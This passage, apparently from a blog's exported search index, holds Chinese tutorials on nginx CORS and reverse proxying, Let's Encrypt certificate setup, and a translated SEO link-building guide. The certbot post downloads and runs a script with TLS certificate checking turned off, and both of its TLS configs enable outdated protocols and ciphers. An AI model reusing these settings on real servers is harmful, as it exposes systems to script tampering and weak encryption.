添加允許的方法，允許的首部 添加一個內容長度為0，類型為 text/plain; charset=utf-8 , 返回狀態碼為 204 的首部 至此，完成 OPTIONS 請求的正確響應。\n跨域請求正確響應 添加如下內容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 location /example { if ($request_method = \u0026#39;OPTIONS\u0026#39;) { add_header Access-Control-Allow-Origin *; add_header Access-Control-Max-Age 1728000; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; add_header Content-Length 0 ; return 204; } + if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) { + add_header Access-Control-Allow-Origin $http_origin; + add_header Access-Control-Allow-Credentials true; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Expose-Headers Content-Length,Content-Range; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 說明： if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) {...}，當 origin 為合法域名(可根據業務調整或去除合法域名驗證)時:\n添加允許源 Access-Control-Allow-Origin 為 $http_origin (可根據業務需要更改) 添加允許認證 Access-Control-Allow-Credentials 為 true ，允許接收客戶端 Cookie(可根據業務需要更改。 但要注意，當設置為true時，Access-Control-Allow-Origin 不允許設置為 *) 添加允許的方法，暴露的首部 至此，完成跨域請求正確響應。\n以上，是對跨域請求在Web Server的解決方案，主要是通過響應 OPTIONS 方法和添加允許源來解決。\n當然，如果本地開發中，可以在利用 webpack-dev-server 的 proxy 選項來快速解決跨域問題：\n示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 // webpack.congf.js module.exports = { //... devServer: { proxy: { \u0026#39;/api\u0026#39;: { target: \u0026#39;http://localhost:3000\u0026#39;, pathRewrite: {\u0026#39;^/api\u0026#39; : \u0026#39;\u0026#39;} } } } } 當訪問地址如 /api/foo?q=bar 時，則通過代理訪問的實際地址是: http://localhost:3000/foo?q=bar。\nNginx反向代理 nginx反向代理，通過修改nginx配置檔案實現反向代理，請求統一通過nginx分發請求\nNginx配置（192.168.75.139） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # 負載均衡 upstream my_site { server 192.168.75.138:8080; server 192.168.75.137:8080; server 192.168.75.136:8080; } server { listen 8081; server_name localhost; location ^~ /api/ { proxy_pass http://my_site/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location = / { proxy_pass http://my_site/nginx/indexNginxCrossQuest.jsp; } location = /nginx/ { proxy_pass http://my_site/nginx/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location ~ \\.(html|htm|ico|png|jpg|jpeg|js|css|bmp)$ { proxy_pass http://my_site; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } 瀏覽器請求（192.168.75.1） 綜合對比 CORS Nginx反向代理 前端程式碼配置 credentials=true 無 後端程式碼配置 setHeader：Allow-Origin、Allow-Methods等 無 服務端配置 無 Nginx配置 移植靈活性 高、無額外配置 低、每增加一個環境都需要增加配置 安全性 高、來源可控、直接追溯 X-Forwarded-For追溯多級來源 安全控制 黑白名單 更新配置 ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305241864_c3ef911be4_o.jpg","permalink":"https://wayneblog.ga/2022-08-23/nginx-cors-and-reverse-proxy/","title":"nginx CORS 跨域與反向代理"},{"content":" 參考文章 IT Note SSL憑證教學 - xoops 免費SSL憑證申請 nginx config產生器 Qualys 的 SSL 伺服器測試工具 版本一 步驟 1 - 下載安裝及執行的腳本 1 2 3 wget https://dl.eff.org/certbot-auto --no-check-certificate chmod +x ./certbot-auto ./certbot-auto -n 生成證書，只需要輸入郵件地址和網站根目錄，提示以下內容，說明安裝完成 1 2 3 Saving debug log to /var/log/letsencrypt/letsencrypt.log Missing command line flags. For non-interactive execution, you will need to specify a plugin on the command line. Run with \u0026#39;--help plugins\u0026#39; to see a list of options, and see https://eff.org/letsencrypt-plugins for more detail on what the plugins do and how to use them. 步驟 2 - nginx設定隱藏目錄訪問 1 2 3 location ~ /.well-known { allow all; } 步驟 3 - 生成域名證書 1 ./certbot-auto certonly --email tony@hack.idv.tw --agree-tos --no-eff-email --webroot -w /var/www/ -d hack.idv.tw 到目錄內查看 1 cd /etc/letsencrypt/live/ 萬用字元的申請指令 (需要驗證dns) 1 certbot-auto certonly -d *.manpc.tk --manual --preferred-challenges dns 步驟 4 - 設定nginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 server { listen 80; # IPv4 listen [::]:80; server_name hack.idv.tw ; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; #rewrite ^(.*) https://$host$1 permanent; return 301 https://www.itnotetk.com$request_uri; #跳轉到Https } server { listen 443 ssl http2; server_name hack.idv.tw ; ssl on; ssl_certificate /etc/letsencrypt/live/hack.idv.tw/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/hack.idv.tw/privkey.pem; client_max_body_size 256m; ssl_dhparam /etc/nginx/certs/dhparam.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_stapling on; ssl_ciphers \u0026#34;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA\u0026#34;; ssl_prefer_server_ciphers on; #add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubdomains; preload\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains;preload\u0026#34; always; # ... Let\u0026rsquo;s Encrypt憑證只有90天 需要手動續約 1 0 1 * * * /root/certbot-auto renew --disable-hook-validation --renew-hook \u0026#34;/etc/init.d/nginx reload\u0026#34; 版本二 網路出處\nLet’s Encrypt 是一家新的證書頒發機構（Certificate Authority，簡稱 CA），其提供免費的 TLS/SSL 憑證再配合 Certbot 這個自動化工具，讓一般的網站可以很容易地使用 HTTPS 的安全加密網頁，設定很簡單，憑證的更新也可以自動處理。 以下我以 Ubuntu Linux 14.04 的系統為例，示範 nginx 伺服器使用 Let’s Encrypt 憑證設定 HTTPS 安全加密網頁的方法。 步驟 1 - 從 Certbot 官方網站下載 certbot-auto 指令稿，並設定其執行權限 1 2 wget https://dl.eff.org/certbot-auto chmod a+x certbot-auto certbot-auto 要放在哪裡都可以，建議一開始就找一個適合的地方放好，例如建立一個 /opt/letsencrypt 目錄，把 certbot-auto 放在這裡 1 2 mkdir /opt/letsencrypt mv certbot-auto /opt/letsencrypt/ 步驟 2 - 執行 certbot-auto ，讓它自動安裝所有相依套件 1 /opt/letsencrypt/certbot-auto 執行 certbot-auto 時，會需要輸入密碼取得 root 權限 步驟 3： 安裝完成所有需要的系統套件後，接著我們要透過 webroot 的方式，使用既有的 nginx 網頁伺服器來向 Let’s Encrypt 取得憑證，而在認證的過程會需要在網頁根目錄中建立一個 .well-known/acme-challenge/ 目錄，讓 Let’s Encrypt 的伺服器來讀取其中的內容。 一般的 nginx 伺服器通常會設定把句點開頭的隱藏檔案都擋掉，遇到這樣的狀況就會無法進行認證，這時候可以再加一小段設定，讓 .well-known/acme-challenge/ 目錄可以被正常讀取。 1 2 3 4 5 6 location ^~ /.well-known/acme-challenge/ { # the usual settings } location ~ /\\. { deny all; } 步驟 4 - 使用 certonly 功能下載憑證 1 /opt/letsencrypt/certbot-auto certonly --webroot -w /var/www/blog.gtwang.org/ -d blog.gtwang.org -d gtwang.org 步驟 5 - 輸入自己的 Email 信箱 步驟 6 - 閱讀使用條款，選擇「Agree」繼續 步驟 7 - 下載完成後，會出現類似這樣的成功訊息 1 2 3 4 5 6 7 8 IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem. Your cert will expire on 2016-08-13. To obtain a new version of the certificate in the future, simply run Certbot again. - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let\u0026#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le 這樣就成功取得 Let’s Encrypt 的憑證了，而 nginx 用的憑證就儲存在 /etc/letsencrypt/live/blog.gtwang.org/ 目錄之下，其中 fullchain.pem 就是 nginx 需要憑證，而 privkey.pem 則是需要保護好的私鑰，關於憑證檔案的詳細說明，請參考 Certbot 的說明文件。 Certbot 還有提供另外一個 standalone 的方式來向 Let’s Encrypt 取得憑證，這種方式是由 Certbot 建立一個獨立的網頁伺服器，提供 Let’s Encrypt 讀取驗證用的資料，不過這樣的做法需要綁定 80 或 443 連接埠，所以通常還會需要暫停既有的網頁伺服器，對於一般的網站而言，會造成網站有幾秒鐘的斷線現象，所以我個人不喜歡這樣的方式。 接下來要設定 nginx 伺服器，使用這個新憑證來提供 HTTPS 的安全加密網頁。 步驟 8 - 要讓 nginx 啟用 HTTPS 安全加密網頁，只要加上 SSL 相關的幾行設定即可，其餘的設定保持不變，以下是我個人使用的 nginx 伺服器設定 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 server { # 傾聽 HTTPS 標準埠號 443 listen 443; # 同時啟用 IPv6 的 HTTPS 安全加密網頁 listen [::]:443; server_name blog.gtwang.org; root /var/www/blog.gtwang.org/; index index.php index.html index.htm; # 啟用 SSL ssl on; # 設定 SSL 憑證 ssl_certificate /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.gtwang.org/privkey.pem; # 其他 SSL 選項 ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # omit SSLv3 because of POODLE (CVE-2014-3566) ssl_ciphers \u0026#39;ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;; ssl_prefer_server_ciphers on; # ... } ssl_protocols 的部分記得要 把SSLv3拿掉 ，避免 POODLE 攻擊（CVE-2014-3566）。 步驟 9 - 設定好之後，檢查一下設定檔是否正確 1 service nginx configtest 步驟 10 - 確認無誤之後，重新載入設定檔 1 service nginx reload 這樣就完成 nginx 伺服器的設定了，接著就可以開啟 HTTPS 加密的網址來測試了，正常來說，使用 Google Chrome 瀏覽器開啟自己主機的 HTTPS 加密網址，應該就會顯示一個綠色的鎖頭，這樣就代表我們安裝的 SSL 憑證是有效的。 Let’s Encrypt 的憑證使用期限只有三個月，在憑證到期前的一個月可以使用 certbot-auto 來更新憑證，在實際更新之前我們可以加入 --dry-run 參數，先進行測試。 1 /opt/letsencrypt/certbot-auto renew --dry-run 若測試沒問題，就可以使用正式指令來更新 1 /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade 而為了方便起見，可以將這個更新指令寫在 /opt/letsencrypt/renew.sh 指令稿中 1 2 #!/bin/sh /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade --post-hook \u0026#34;service nginx reload\u0026#34; 這裡我又加上一個 --post-hook 的設定，讓憑證更新完後，可以自動重新載入 nginx 伺服器的設定，讓憑證生效。\n接著把這個 /opt/letsencrypt/renew.sh 指令稿寫進 crontab 中\n1 2 # m h dom mon dow command 30 2 * * 0 /opt/letsencrypt/renew.sh 官方的建議是這個指令可以一天執行兩次，讓伺服器的憑證隨時保持在最新的狀態，這裡我是設定讓伺服器每週日凌晨兩點半進行憑證的檢查與更新，Certbot 只有在憑證到期前一個月才會進行更新，如果憑證尚未到期，就不會更新 ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305205270_220313b3c4_o.png","permalink":"https://wayneblog.ga/2022-08-23/nginx-ssl-with-lets-encrypt/","title":"nginx 設定 ssl ＋ 自動續約 Let’s Encrypt 免費域名證書"},{"content":" 本文翻譯自：LINK BUILDING FOR SEO:The Definitive Guide (2022)\n這是一篇完整的 2022 年連結優化指南。\n因此，如果你想要取得權威網站的反向連結。\n你將會在這篇新指南中，享受本文可操作的技巧。\n讓我們往深入其中吧。\n第 1 章：連結優化基礎 在本章節，我將向你解答此問題：「什麼是連結建立？」\n同時，我也會向你展現為何連結建立，在 2022 年的今天仍然很重要。\n讓我們開始吧！\n什麼是連結建立？ 「連結建立」是一種打造單向超連結（又名反向連節），到另一個網站的方法。\n希望藉此改善網站的搜尋引擎能見度。\n常見的連結優化策略包含內容行銷、建立有用的工具、電子郵件推廣、破損連結優化與公共關係。\n為什麼連結這麼重要？ 若要理解它，你將需要跳上時光機，並重返早期網路時代的 Google 。\n在過去的日子，搜尋引擎如 Yahoo！與 Alta Vista 是主要支配者。\n他們排序搜尋結果的方式，100% 是基於網頁上的內容\n輸入：Google\n現今他們知名的 PageRank 演算法改變了這場遊戲。\nGoogle 不是單純分析網頁的內容，而是查看有多少人連結到該頁面。\n而他們是正確的。\n在接近 20 年以後，連結仍然是衡量網頁品質的最好方法。\n這就是為何 Google 仍然將反向連節視為排名的信號之一。\n此外，由於企鵝演萬法的更新，Google 現在專注在連結的品質（而非連結數量）\n你可能會疑惑：\n什麼是高品質的連結，具體是什麼？我又該如何打造他們？\n這就是我要在下一個章節涵蓋的內容。\n繼續往下看\u0026hellip;\n第 2 章：如何找到高品質的連結 在我們深入連結優化的逐步策略前，知道什麼是好（或壞）連結很重要。\n這樣，你可以專注在優化能改善 Google 排名的連結。\n因此，以下是如何辨認值得優化連結的方法：\n頁面權重 請問與你連結的那個網頁，在 PageRank 中是不是個有力人士？\n如果是的話，那將會讓你的排名擁有一個巨大的影響。\n事實上，從多年的測試中，我已經發現頁面權重的傳遞，將比任何其他因素更重要。\n這是因為來自一個權威性頁面的連結，將提供更多權重值（又被稱為 PageRank）給你的網站。\n（筆記：雖然 Google 並沒有公開分享關於 PageRank 的資訊，他們仍然將其視為演算法的基礎）\n你可以使用 Semrush ，輕易的察看 PageRank 的大約指標。\n只要在 Semrush 填入網址，並查看「Page Authority Score」數值。\n網站權重 一個連結的品質，同樣受到該網域的「網站權重」決定。\n普遍上來說，一個來自紐約時報的連結，將會比來自一個無名氣部落格的連結，產生還要大的影響力。\n雖然這些連結很難取得，但它們仍然值得爭取。\n同理，Semrush 一樣能派上用場。\n在工具中輸入網域名稱，並查看它的「Authority Score」數值。\n網站相關性 當我們提到連結，一個網站的權重很重要。\n但該網站的關聯性同樣重要。\n舉例來說，假設你經營一個關於「原始人減肥法」的網站。\n你想要從一個權威性的網站取得連結\u0026hellip;.像是單輪車，這樣的連結仍算數嗎？\n根據一位前 Googler 的訪談內容，結果顯示並非如此。\n:::info\n「從一個高 PageRank 頁面取得的連結，在過去通常很有價值。」\n「如今，演算法更注重該網站與你內容的關聯性。」\n「關聯性是新的 PageRank」\n:::\n大致上，你會想要從具權威性的網站取得連結，特別是該網站與你的內容，擁有相近的關聯。\n頁面上連結的位置 請問你的連結，是否內嵌在部分內容中嗎？\n或是埋在網頁的頁尾？\n事實證明，你的連結在頁面上的位置很重要。\n特別是埋藏在頁首與測攔的連結，並不如頁面正文區塊的連結有價值。\n網站底部呢？你會希望你的連結出現在網頁的主要區塊。\n連結是否由編輯方式放上的？ 不論你的連結是否出現在網頁，你應該詢問自己：\n「此連結是否由編輯方式放上去的？」\n換句話說，是否有人將自己網站與你的網站連結，單純是因為他們認為你的網站很讚？\n如果是的話，這就是一個編輯連結（editorial link）\n或是你在一個隨機網站創造帳戶，並在那邊放下一個自己網站的反向連結？\n這就不是編輯連結。\n如你所料，Google 更加重視編輯連結。\n:::info\n引言自 Google\n「以非編輯方式放上一個連結，或未經網站擁有人在網頁上的認證，又被稱為非自然連結。」\n「它可以被視為違反我們的搜尋指南」\n:::\n連結錨點文字 錨點文字是一個可被點擊的文字連結區塊。\n事實證明，Google 使用錨點文字作為排名訊號。\n舉例來說，你取得一個連到你網站的錨點文字：原始人甜點\nGoogle 看到該錨點文字，並說：\n恩\u0026hellip; 這個網站使用「原始人甜點」錨點文字，該連結導向的網頁一定是關於「原始人甜點」。\n當然，如同其他 SEO 技巧，關鍵字豐富的錨點文字已經被濫用。\n現今，建立一大堆準確描述的錨點文字，仍會被視為垃圾內容。\n簡短來說，我不推薦透過關鍵字豐富的錨點文字，用以建立反向連結。\n如果你是真的從錨點文字取得反向連結，還是值得慶祝。\n連結共現 「共現」是指文字與片語共同出現在你的連結上。\nGoogle 可能使用共線作為「子錨點文字」(baby anchor text)\n如果你這樣思考，就能理解：\n那些圍繞在連結上的文字，同樣提供該頁面的線索。\n既然如此，Google 又有什麼理由何不去使用呢？\n連結是否來自客作文章？ 幾年前，Google 站出來說：\n:::info\n「有件事已經無法繼續下去了：客座文章已經結束，他已經變得太過低廉」\n－Matt Cutts，前 Google 垃圾郵件團隊主管\n:::\n這是真的嗎？\n恩\u0026hellip;他取決於當下條件。\n以下這一些紅旗舉動，會使客座文章變得沒有價值。\n某人付費刊登文章 文章包含完全比對的錨點文字 該網站只為了發布客座文章單獨存在 該網站與你的網站不相關 但如果你在一個具權威性、關聯性的網站，發布一個令人驚艷的文章呢？\n在我的經驗，該連結可以幫助你爭取排名\nNofollow vs Dofollow 「rel=\u0026ldquo;nofollow\u0026rdquo;」是一個連結標籤，用來告訴搜尋引擎：不要將此連結當成一個網站背書。\n明顯地，當到了 SEO 領域，你會想要盡可能，取得一個正常「dofollow」連結。\n現在，你可以知道如何衡量連結品質，是時候開始建立他們。\n第 3 章：如何透過內容行銷，取得世界級的連結 內容是解鎖良好反向連結的關鍵，已經不是什麼秘密了。\n但這樣說好了：\n單純發布內容，並不會讓你取得任何連結。\n事實證明，特定類型的內容最適合取得反向連結。\n以下是四種內容類型，幫助你產生更多連結：\n一、視覺資產 它是什麼 視覺資產是：\n圖片 圖表 資訊圖 視覺導向的內容與圖表 它為什麼有用 視覺內容超級容易取得連結。\n舉例來說，當你發布一個圖片在你的網站，任何人在他們的網站分享此圖，當會讓你取得反向連結。\n這個強大的「當你分享我的圖片，請連結我的網站」關係，並不作用於任何文字基礎的內容。\n實際例子 幾年前我在自己的網站，發布了一個關於 Google 點擊率的圖表。\n直到現今，此圖已經被連結數十次（許多來自行銷領域的權威網站）\n確實，即使我使用表格呈現，仍可能取得這些連結。\n但這些連結的建立，有大部一部分（我預估 75%）是因為我以視覺方式呈現。\n事實上，我的許多連結，來自人們直接將我的視覺圖表，張貼到他們的網站上（並作為來源連回我的網站）。\n有趣的事，直到 2022 年的今天，每個月人們仍然連結此圖。\n這就是創造視覺圖表的強大之處。\n二、列點文章 它是什麼 一系列的方法、技術、原因、迷思或關於任何事情。\n它為什麼有用 列點文章將大量的價值，包裝成一份份可一口咬下的內容。\n事實上，當 BuzzSumo 分析一百萬篇文章時，他們發現這些列點文章，相較於其他形式的內容，產生更多反向連節。\n它勝過測驗、影片，甚至是資訊化圖表。\n實際例子 《2022 最新的 19 個 SEO 技巧》這個列表文章，是我最熱門的一個內容。\n沒錯，它產生一大堆分享\u0026hellip;\n以及留言\n但最重要的是，此貼文是一個連結磁鐵。\n它擁有超過 4,000 條連結。\n也因為此文章，擁有這麼多連結指向它，它取得關鍵字「SEO Techniques」的前 5 名。\n三、原創的研究與數據 它是什麼 從產業報告、調查或原創研究中，揭露最新數據的內容。\n它為什麼有用 研究與數據具有高度可連結性。\n當某人引用你的數據，它會與你連結，這些連結增加得非常快。\n實際例子 前些日子，我發布一篇大型 Google 排名因素調查。\n不用說，此貼文滿載了大量原始數據。\n這就是為什麼此貼文至今，可以累計 18,900 則反向連節，這個驚人的數字。\n如我上述提及，這些連結大多數來自人們引用我們的研究：\n四、深度完整的指南 它是什麼 一個關於某主題綜合性資源，其中包含所需要知道的一切事物。\n它為什麼有用 終極指南將驚人數量的資訊集中在一處，並使你的指南，成為該資源的首選。\n實際例子 我曾經從 email 收到人們詢問我，關於每日關鍵字研究的基本概念。\n很不幸地，關於這個非常重要的主題，那時在我的部落格中，並沒有任何內容。\n因此，我創造了一個：《SEO 關鍵字研究：終極指南》\n因為這個多章節的指南，涵蓋了其他網路資源沒有的內容。\n它已經被連結超過 37,700 次。\n現在，你已經創造出一些值得連結的內容，是時候打造一些連結。\n如何做？\n透過非常經典的電子郵件推廣。\n第 4 章：如何透過電子郵件推廣，打造強而有力的連結 如果你想要在 2022 年打造白帽連結，你需要使用電子郵件推廣。\n問題是：\n你的信件如何與部落客與記者們聯繫上，而非被丟進垃圾信件的資料夾中。\n閱讀本章節，找出方法。\n步驟一：找到「可能連結者」 如同名稱所述，可能連結者是一群可能會連結你網站的人。\n我將會在第 6 章，向你展項找出「可能連結者」的一大堆技巧。\n但現在，讓我們先使用簡單的策略，用來辨認出他們：反向工程。\n首先，在 Google 搜尋你的關鍵字。\n在第一頁搜尋結果頁，挑選一個網站連結，並放進連結分析工具（我使用Semrush 為例）\n接著，點擊側攔的「反向連節分析」，再點「反向連節」。\n這個網站會在下方，條列出全部的可能連結者。\n(你如何知道哪個網站值得鎖定、哪個網站要忽略？去查看第二章的內容)\n步驟二：找到他們的電子郵件地址 現在，你已經找出可能連結者，是時候挖出他們的電子郵件地址。\n:::danger\n進階技巧：僅在不得已的情況下，才去使用網站的聯繫表單，因為那一個黑洞\n:::\n以下是執行步驟：\n使用 Hunter.io\nHunter.io 非常適合用於聯繫小型網站與個人部落格。\n單純在工具中輸入網站\n接著，他將會向你展現，與該網域關聯的電子郵件地址。\n但如果你想要接觸大型網站呢？梳理這份清單將會非常痛苦。\n這就是為什麼，針對這些情境，我推薦 VoilaNorbert\nVoilaNorbert 藉由 VoilaNorvert.com ，你只要輸入某人的名字與工作的網域，就能成功運作，而不需輸入網址。\n這樣，你就能接觸到那些可能連結者，並讓他們把你網站連結，放到他們頁面上的。\n同時，它也會向你展現特定對象的電子郵件地址。\n步驟三：寄給他們一個客製化的內容 如果你想使電子郵件推廣規模化，你將會需要使用模板。\n使用模板的技巧在於，不要讓你的模板看起來像模板（下個步驟會解釋更多細節）\n但現在，以下是我執行最好的電子郵件模板之一\n:::info\n嗨（名稱）。\n我今天正尋找關於（某主題）的內容，偶然發現你的文章：（文章標題）\n我發現它的內容非常好！其中，我特別喜歡（他們文章的特定內容）。\n此外，我最近也在（你的主題）發布了一個新指南：（網址）。\n作為一位在撰寫關於（某主題）的人，我認為你也會喜歡它。\n我的指南同樣可能，成為你網頁上的一個不錯的延伸閱讀。\n不論如何，希望你繼續在（對方網站）提供精彩的作品。\n有空再聊。\n:::\n注意到這個範本，內含了許多客製化的資訊，卻不需花費許多力氣。\n第 5 章：黑帽連結優化的真實情況 如果沒有關於黑帽 SEO 的章節，任何連結優化的指南都不完整。\n黑帽連結優化非常容易被發現：\n如果取得反向連節的方法，與 Google 的網站指南違背，它大概就是黑帽。\n這就表示，你應該避免使用黑帽優化連結嗎？\n這個選擇取決於你。\n我個人不建議使用黑帽優化連結（風險與回報不成比例）。\n話雖如此，不論你是一位白帽或黑帽 SEO，你都需要知道 Google 給予黑帽的懲罰。\n因此，我們簡單統整它們：\nGoogle 企鵝 它是什麼： 一個懲罰演算法，用來針對使用垃圾連結建立權重的特定網站。\n例如，可疑的客座文章或文章留言處的垃圾訊息。\n如何避免它： 只有建立白帽連結能避免。\n有數據顯示，你可以藉由最小化完全匹克錨點文字，用以躲避企鵝演算法。\n(我說過錨點文字是另一個內容了，但它的關鍵在於信任)\n換句話說，躲避企鵝演算法最簡單的方式，就是避免使用可疑的連結（或錨點文字）\n手動懲罰與非自然連結 它是什麼： 一位來自 Google 公司員工的手動懲罰。\n它與企鵝演算法不同，Google 將會藉由 Google Search Console 寄給妳一封訊息。\n如何避免它： 除了 Google 以外，沒人知道自己的網站為什麼被手動懲罰。\n我的看法是有某個演算法，指出一個網站正在玩弄系統。\n因此，他們將網站過濾出來並做手動檢驗。\n可知，最好的避免方式是擁有一個非常乾淨的反向連結檔案。\n此外，不像企鵝演算法，你可以透過「禁止連結指向網站」與「申請重新審查」從手動懲罰中恢復。\n第 6 章：我最喜歡的 3 個連結優化策略（按步驟教學） 本章節不需要前言。\n以下是我用實戰經驗驗證，取得世界級反向連結的 3 個策略。\n資源頁面連結優化 首先，什麼是資源頁面？\n資源頁面是指在特定主題中，整合擁有良好內容的連結。\n以下是範例：\n因為這些頁面存在的原因，是將使用者導向適合的地方。\n因此，這是個絕佳的連結建立策略。\n以下是具體步驟：\n步驟 1：找到資源頁面 在 Google 使用這些搜尋字詞。\n他們是專門設計用來挖掘資源頁面：\n關鍵字 + inurl:links 關鍵字 + 「有幫助的資源」 關鍵字 + 「有用的資源」 關鍵字 + 「有用的連結」 步驟 2：檢視該頁面 以下是你需快速回答的問題：\n「來自這個網頁的連結，值得努力爭取嗎？」\n（提醒：使用第 2 章的技巧簡化此步驟）\n舉例來說，這個資源頁擁有一個體面的 URL 分數：12，還不錯。\n它同樣擁有一個具權威性的網站。\n而我的連結，最後將會在此網頁的主體區塊，如同勝利者般。\n步驟 3：找到最符合的內容 注意：\n你可能擁有是世界上最好的內容，但如果它與資源頁的主題不相搭呢？\n你將不會取得該連結。\n因此此步驟的目的，是要找出與你內容相符的資源頁面。\n依但你識別出內容，跳至第四步驟\n步驟 4：寄送此封經測試的模板 以下是我建議的模板：\n:::info\n標題：關於（對方網站）的問題\n\u0026ndash;\n嗨（名字）。\n今早，我在 Google 搜尋關於（主題）的內容時，看到你的優質資源頁：（網址）\n我只是想要跟你說：你的網頁幫了我很大的忙。\n如果沒有此網頁，我將永遠不會找到（該網站連結的資源）。\n有趣的事：我上個月剛發布了一個關於（主題）的指南，它是（簡短摘要）。\n如果你想查看該內容，以下是連結：（）\n此外，我的指南也可能是適合添加到你的網頁。\n不論如何，謝謝你將相關資源條列整理。\n祝你有個美好的一天！\n期待回復。\n（你的名字）\n:::\n:::danger\n如同所有外部接觸的模板，確保此模板盡可能客製化。\n你可以使用一個「看起來一點都不像模板」的模板。\n:::\n破損連結優化 「破損連結優化」一直是我最喜歡的優化策略。\n為什麼？\n透過破損連結優化，你可以替某人的網站提高價值，而非直接請求連結。\n以下是執行步驟：\n1. 安裝 Check My Links 或 LinkMiner 上述兩者工具，都能快速找到任何網頁的破損連結（透過你的 Chrome 瀏覽器）。\n我將會在接下幾分鐘，線你展示如何使用它們。\n2. 找到擁有許多外部連結的頁面 一個網頁越多連結，他們之中越有可能會產生破損連結。\n資源頁非常適用於此情況。\n因此，請盡情使用上文的搜尋字串，找出相應的資源頁。\n4. 查看破損連結 以下，是你執行在步驟一安裝的外掛的地方。\n它將會透漏該頁面的破損連結：\n4. 寄送郵件給該網站管理員，告知關於破損連結的事情 最後，讓經營該網頁的人，知道該頁的破損連結，並作為交換，讓對方連結你的網站。\n以下是我建議的模板：\n:::info\n標題：（對方網站名稱）的問題\n\u0026ndash;\n你好(姓名)，請問你還有再更新你的網站嗎？\n我在搜尋（主題）的內容時，發現你絕佳的網頁：（網頁標題或網址）\n然而，我發現有幾則連結是否已失效：\n（破損連結的網址）\n此外，我最近發布（簡短的內容描述）。\n它可能適合取代（指出特定的破損連結）。\n不論如何，希望這有幫助到你。\n謝謝\n（你的名字）\n:::\n摩天大樓技術 這部影片將手把手，帶你走過全部流程。\n{%youtube 263xIymvLl4 %}\n一旦你觀看完此影片，就是時候進入下一章節：\n非常棒的連結優化案例研究！\n第 7 章：驚人的案例研究 現在，是時候向你展現連結優化實際的例子。\n最棒的部分是，我之前從來沒有分享過這些內容。\n案例一 Julie 如何使用摩天大樓技巧，增加 194.1% 的自然搜尋流量 Julie Adams 的部落格：我們美麗的星球，曾經非常掙扎。\n確實，Julie　